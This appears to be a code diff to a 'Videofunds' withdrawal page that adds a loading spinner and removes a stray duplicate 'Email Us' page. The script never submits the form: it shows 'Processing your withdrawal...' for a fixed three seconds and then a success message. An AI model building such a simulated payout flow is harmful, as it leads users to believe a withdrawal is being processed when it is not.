@@ -28,6 +28,7 @@
       padding: 30px;
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      position: relative; /* Added for spinner positioning */
     }
 
     h1 {
@@ -73,6 +74,11 @@
       background-color: #a00000;
     }
 
+    .btn:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+
     /* Modal Styles */
     .modal {
       display: none;
@@ -84,6 +90,43 @@
       height: 100%;
       overflow: auto;
       background-color: rgba(0, 0, 0, 0.6);
+    }
+
+    /* Loading Spinner Styles */
+    .spinner-overlay {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 100;
+      border-radius: 10px;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    .spinner {
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid darkred;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin-bottom: 15px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .spinner-text {
+      font-size: 16px;
+      color: darkred;
+      font-weight: bold;
     }
 
     .modal-content {
@@ -128,6 +171,11 @@
   <div class="navbar">Videofunds</div>
 
   <div class="container">
+    <div class="spinner-overlay" id="spinnerOverlay">
+      <div class="spinner"></div>
+      <div class="spinner-text">Processing your withdrawal...</div>
+    </div>
+
     <h1>Congratulations! Your Account is Now Approved for Withdrawal</h1>
 
     <h2>Please Enter Amount you want to Withdrawal</h2>
@@ -155,7 +203,7 @@
         placeholder="+255XXXXXXXXX"
       />
 
-      <button type="submit" class="btn">Confirm</button>
+      <button type="submit" class="btn" id="confirmBtn">Confirm</button>
     </form>
   </div>
 
@@ -171,11 +219,30 @@
   <script>
     const form = document.getElementById('withdrawForm');
     const modal = document.getElementById('successModal');
+    const spinnerOverlay = document.getElementById('spinnerOverlay');
+    const confirmBtn = document.getElementById('confirmBtn');
 
     form.addEventListener('submit', function(e) {
       e.preventDefault(); // prevent actual submission
+      
       if (form.checkValidity()) {
-        modal.style.display = 'block';
+        // Show the loading spinner
+        spinnerOverlay.style.display = 'flex';
+        
+        // Disable the confirm button to prevent multiple clicks
+        confirmBtn.disabled = true;
+        
+        // Simulate processing delay (3 seconds)
+        setTimeout(function() {
+          // Hide the spinner
+          spinnerOverlay.style.display = 'none';
+          
+          // Show the success modal
+          modal.style.display = 'block';
+          
+          // Re-enable the confirm button
+          confirmBtn.disabled = false;
+        }, 3000); // 3 seconds delay
       }
     });
 
@@ -191,47 +258,6 @@
       }
     }
   </script>
-
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Email Us Button</title>
-  <style>
-    body {
-      background:"images/background.jpg";
-      margin: 0;
-      padding: 0;
-    }
-
-    .email-button {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      background-color: darkred;
-      color: white;
-      padding: 12px 20px;
-      border: none;
-      border-radius: 5px;
-      text-decoration: none;
-      font-size: 16px;
-      font-family: Arial, sans-serif;
-      z-index: 1000;
-      box-shadow: 0 4px 6px rgba(0,0,0,0.3);
-    }
-
-    .email-button:hover {
-      background-color: #a10000;
-    }
-  </style>
-</head>
-<body>
-
-  <a href="mailto:officialvideofunds@gmail.com?subject=Support%20Request" class="email-button">
-    Email Us
-  </a>
 
 </body>
 </html>
